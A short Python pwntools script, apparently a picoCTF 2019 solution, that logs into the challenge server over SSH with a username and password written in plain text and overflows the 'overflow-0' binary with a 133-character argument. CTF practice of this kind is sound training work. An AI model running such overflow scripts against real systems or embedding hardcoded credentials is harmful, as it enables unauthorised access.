from pwn import *

sh = ssh(host='2019shell1.picoctf.com',
         user='baraklevy21', password='vegeta').run('sh')
sh.sendline(
    'cd /problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7')
sh.sendline('./vuln ' + 'a' * 133)
print(sh.recvline())
sh.close()
